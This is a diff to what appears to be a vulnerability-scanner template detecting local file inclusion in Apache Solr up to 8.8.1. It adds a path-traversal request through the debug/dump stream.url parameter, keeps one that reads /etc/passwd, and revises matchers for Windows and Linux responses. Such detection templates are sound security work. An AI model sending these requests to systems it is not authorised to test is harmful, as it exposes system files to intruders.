@@ -2,7 +2,7 @@ id: apache-solr-file-read
 
 info:
   name: Apache Solr <= 8.8.1 - Local File Inclusion
-  author: DhiyaneshDk
+  author: DhiyaneshDk, philippedelteil
   severity: high
   description: Apache Solr versions prior to and including 8.8.1 are vulnerable to local file inclusion.
   reference:
@@ -22,6 +22,12 @@ requests:
         Host: {{Hostname}}
         Accept-Language: en
         Connection: close
+        
+      - |
+        GET /solr/{{core}}/debug/dump?stream.url=file:///../../../../../&param=ContentStream HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: en
+        Connection: close
 
       - |
         GET /solr/{{core}}/debug/dump?stream.url=file:///etc/passwd&param=ContentStream HTTP/1.1
@@ -37,14 +43,21 @@ requests:
         regex:
           - '"name"\:"(.*?)"'
 
-    matchers-condition: and
     matchers:
-      - type: status
-        status:
-          - 200
-
+      - type: word
+        name: "Windows"
+        words:
+          - "Windows"
+          - "Users"
+          - "org.apache.solr.handler.DumpRequestHandler"
+        condition: and
       - type: regex
+        name: "Linux"
         regex:
           - "root:.*:0:0:"
-
+      - type: word
+        name: "Other"
+        words:
+          - "java.io.FileNotFoundException"
+  
 # Enhanced by mp on 2022/07/22
